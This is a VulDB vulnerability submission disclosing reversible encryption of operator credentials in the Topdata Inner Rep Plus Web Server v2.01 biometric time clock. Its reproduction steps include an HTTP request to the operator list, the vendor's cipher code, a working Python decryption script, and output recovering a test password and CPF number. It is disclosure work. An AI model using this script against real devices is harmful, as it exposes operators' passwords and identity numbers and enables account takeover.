![VulDB](/_thm/vuldb.png)

* Home
  + Overview
  + [Live Recent](?live.recent)
  + [Live Updates](?live.updates)
  + [Live Archive](?live.archive)
  + [Live Submits](?live.submits)
* [Entries](?recent)
  + [Recent](?recent)
  + [Updates](?updates)
  + [Commits](?commits)
  + [Archive](?archive)
  + [CNA](?cna)
  + [Stats](?stats)
  + [Submits](?submits)
  + [Add](?id.add)
* [Products](?product)
  + [Vendor](?vendor)
  + [Product](?product)
  + [Type](?type)
* [Risk](?cvssv3)
  + [CVSSv4](?cvssv4)
  + [CVSSv3](?cvssv3)
  + [CVSSv2](?cvssv2)
  + [Risks](?risk)
  + [Exploits](?exploits)
* [Threat](?cti)
  + [Analysis](?cti.analyze)
  + [Activities](?activities)
  + [Events](?events)
  + [Actors](?actor)
  + [IP addresses](?ip)
  + [Country](?country)
  + [Sector](?sector)
  + [Exploit Prices](?exploitprices)
* [References](?references)
  + [References](?references)
  + [Tools](?tools)
  + [Videos](?videos)
  + [Google Hacking](?googlehacking)
  + [Exports](?export)
* [Search](?search)

  + [Search](?search)
  + [Advanced Search](?search.advanced)
  + [User](?user)
  + [Feeds](?feeds)
  + [API](?kb.api)
* [Support](?kb)
  + [Knowledge Base](?kb)
  + [FAQ](?kb.faq)
  + [Changelog](?kb.changelog)
  + [Roadmap](?kb.roadmap)
  + [Status](?status)
  + [Contact](?contact)
* [Login](?login)
  + [Login](?login)
  + [Signup](?signup)
  + [Purchase](?pay)
  + [Terms of Use](?kb.terms)

* [Live](?live.submits)
* [Submits](?submits)
* [Add](?id.add)
* [Policy](?kb.submission)
* [Purchase](?pay)

[Login](?login)[Signup](?signup)üõ° Home[Submit](?submit)422604
# Submit #422604: Topdata Top Data Inner Rep Plus Web Server v.2.01 Cryptographic Issues[info](?kb.submission)

| Title | Topdata Top Data Inner Rep Plus Web Server v.2.01 Cryptographic Issues |
| --- | --- |
| Description | Title: Top Data Inner Rep Plus reversible encryption An reversible encryption vulnerability has been identified in Top Data Inner Rep Plus - Web Server v.2.01. This vulnerability allows a user to recover the operators password. TopData has a product called Top Data Inner Rep Plus, that is a Biometric Time Clock. This product uses a web service that has a vulnerability in version Web Server v.2.01. Basically, when the user are logged as "admin", it is able to visualize the operators list. Checking this request using burp suite is possible to see that the application responds the request with an list of operators, with credentials encrypted. Analyzing the source code of the endpoint "td.js.gz" is possible to see the functions to encrypt and decrypt the credentials and confirm the weakness. Using this part of code is possible to create an script to recover the operators credentials (reverse encryption). Considering this situation, a malicious actor can use operator user credentials to execute arbitrary actions or to see sensitive data with the legit user login. Steps to reproduce: 1 - Log on the application as admin and call some operator profile: GET /operadorList/4?\_=1728316114453 HTTP/1.1 Host: {IP} User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:109.0) Gecko/20100101 Firefox/115.0 Accept: application/json, text/javascript, \*/\*; q=0.01 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br X-Requested-With: XMLHttpRequest Connection: keep-alive Referer: http://[IP}/InnerRepPlus.html Cookie: session\_id=33180 view-source:http://[IP]/InnerRepPlus.html 2 - Analyze the application response to see the credentials encrypted: HTTP/1.1 200 OK Content-Type: application/json; charset=ISO-8859-1 Access-Control-Allow-Origin: \* Content-Length: 135 {"operador":[{"id": "4", "name": "96AA8DF471", "pwd": "B68AADD4515C96AD2B5966F8", "cpf": "FBDCEB900112D1F0755C63", "permissoes": "3"}]} 3 - Open the source code of main page: <!DOCTYPE html> <html lang="pt-br"> <head> <title>Inner Rep Plus | TOPDATA</title> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <meta name="viewport" content="initial-scale=1.0"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <script type="text/javascript" src="jquery-1.11.3.min.js.gz"></script> <script type="text/javascript" src="td.js.gz"></script> <script type="text/javascript" src="bootstrap.min.js.gz"></script> <link rel="stylesheet" href="bootstrap-theme.min.css.gz" /> <link rel="stylesheet" href="bootstrap.min.css.gz" /> <link rel="stylesheet" href="font-awesome.min.css.gz" /> <link rel="shortcut icon" type="image/png" href="faviconTopdata.png" /> <script type="text/javascript" src="jquery.mask.min.js.gz"></script> <script type="text/javascript" src="jquery.dataTables.min.js.gz"></script> <link rel="stylesheet" href="jquery.dataTables.min.css.gz" /> <script src="jquery-ui.min.js.gz" type="text/javascript"></script> <link rel="stylesheet" href="jquery-ui.min.css.gz" /> <script src="Blob.js.gz" type="text/javascript"></script> <script src="jquery.form.js.gz" type="text/javascript"></script> 4 - Open the source code of "td.js.gz" script and navigate to the encryption part: var cripto = function(value){ var byteCripto = 0; var sequenciaCripto = 3535; var arrayAux = ''; //console.log(value) if(value){ var buffer = stringToByteArray(value); buffer.forEach(function(byteBuff){ byteCripto = byteBuff; byteCripto = byteCripto ^ (sequenciaCripto / 256); byteCripto = byteCripto ^ (sequenciaCripto % 256); var msb = parseInt(byteCripto / 16); var lsb = byteCripto % 16; var strMsb = msb.toString(16).toUpperCase(); var strLsb = lsb.toString(16).toUpperCase(); arrayAux += strMsb + strLsb.toString(); sequenciaCripto = (sequenciaCripto \* 107) % 251; }); } return arrayAux; } var desCripto = function(value){ var byteCripto = 0; var sequenciaCripto = 3535; var arrayAux = ''; // console.log(value); if(value){ var buffer = stringHexToIntArray(value); buffer.forEach(function(byteBuff){ byteCripto = byteBuff; byteCripto = byteCripto ^ (sequenciaCripto / 256); byteCripto = byteCripto ^ (sequenciaCripto % 256); var msb = parseInt(byteCripto / 16); var lsb = byteCripto % 16; var strMsb = msb.toString(16).toUpperCase(); var strLsb = lsb.toString(16).toUpperCase(); arrayAux += String.fromCharCode(parseInt(strMsb.toString() + strLsb.toString(),16)); sequenciaCripto = (sequenciaCripto \* 107) % 251; }); } // console.log(arrayAux); return arrayAux; } 5 - Using the application code information, write a script to decrypt: cat /home/kali/Desktop/descriptografia.py import sys def string\_to\_byte\_array(value): return [ord(char) for char in value] def string\_hex\_to\_int\_array(value): return [int(value[i:i+2], 16) for i in range(0, len(value), 2)] def cripto(value): byteCripto = 0 sequenciaCripto = 3535 arrayAux = '' if value: buffer = string\_to\_byte\_array(value) for byteBuff in buffer: byteCripto = byteBuff byteCripto = byteCripto ^ (sequenciaCripto // 256) byteCripto = byteCripto ^ (sequenciaCripto % 256) msb = byteCripto // 16 lsb = byteCripto % 16 strMsb = hex(msb)[2:].upper() strLsb = hex(lsb)[2:].upper() arrayAux += strMsb + strLsb sequenciaCripto = (sequenciaCripto \* 107) % 251 return arrayAux def descripto(value): byteCripto = 0 sequenciaCripto = 3535 arrayAux = '' if value: buffer = string\_hex\_to\_int\_array(value) for byteBuff in buffer: byteCripto = byteBuff byteCripto = byteCripto ^ (sequenciaCripto // 256) byteCripto = byteCripto ^ (sequenciaCripto % 256) msb = byteCripto // 16 lsb = byteCripto % 16 arrayAux += chr(msb \* 16 + lsb) sequenciaCripto = (sequenciaCripto \* 107) % 251 return arrayAux if \_\_name\_\_ == "\_\_main\_\_": if len(sys.argv) != 2: print("Uso: python3 script\_descripto.py <valor\_criptografado>") sys.exit(1) valor\_criptografado = sys.argv[1] valor\_descriptografado = descripto(valor\_criptografado) print("Valor descriptografado:", valor\_descriptografado) 6 - Run the script on credentials collected: Values: "name": "96AA8DF471" "pwd": "B68AADD4515C96AD2B5966F8" "cpf": "FBDCEB900112D1F0755C63" ‚îå‚îÄ‚îÄ(kali„âøkali)-[~] ‚îî‚îÄ$ python3 Desktop/descriptografia.py 96AA8DF471 Valor descriptografado: TESTE ‚îå‚îÄ‚îÄ(kali„âøkali)-[~] ‚îî‚îÄ$ python3 Desktop/descriptografia.py B68AADD4515C96AD2B5966F8 Valor descriptografado: testevuln123 ‚îå‚îÄ‚îÄ(kali„âøkali)-[~] ‚îî‚îÄ$ python3 Desktop/descriptografia.py FBDCEB900112D1F0755C63 Valor descriptografado: 93505821047 Link of the vendor and product site: https://www.topdata.com.br/relogio-de-ponto-biometrico/ |
| Source | ‚ö†Ô∏è https://www.topdata.com.br/relogio-de-ponto-biometrico/ |
| User | [Anonymous User](?kb.anonymous) |
| Submission | 10/11/2024 11:32 PM (3 months ago) |
| Moderation | 10/18/2024 03:43 PM (7 days later) |
| Status | [Accepted](?kb.submission) |
| VulDB Entry | [280916](?id.280916) [Topdata Inner Rep Plus WebServer 2.01 td.js.gz risky encryption] |
| Points | 20 |

[‚óÇ Previous](?submit.422603)[Overview](?submit)[Next ‚ñ∏](?submit.422605)

# Are you interested in using VulDB?

Download the whitepaper to learn more about our service!

## Notice

Submissions are made by [VulDB community users](?user). VulDB is *not responsible* for their content nor the links to external sources.

Please use the raw information shown and the links listed *with caution*. They might contain malicious and harmful actions, code or data.

The corresponding VulDB entries contain the moderated, verified, and normalized information provided within the raw submission.

## Documentation

* [Submission Policy](?kb.submission)
* [Data Processing](?kb.processing)
* [CVE Handling](?kb.cna)
[¬© 1997-2025 vuldb.com](?kb.terms) ¬∑ [cc by-nc-sa](https://creativecommons.org/licenses/by-nc-sa/4.0/)[de](/de/?submit.422604 "German") ¬∑ [fr](/fr/?submit.422604 "French") ¬∑ [it](/it/?submit.422604 "Italian") ¬∑ [es](/es/?submit.422604 "Spanish") ¬∑ [pt](/pt/?submit.422604 "Portuguese") ¬∑ [ru](/ru/?submit.422604 "Russian") ¬∑ [pl](/pl/?submit.422604 "Polish") ¬∑ [sv](/sv/?submit.422604 "Swedish") ¬∑ [zh](/zh/?submit.422604 "Chinese") ¬∑ [ja](/ja/?submit.422604 "Japanese") ¬∑ [ar](/ar/?submit.422604 "Arabic")[v18.14.7](?kb.changelog)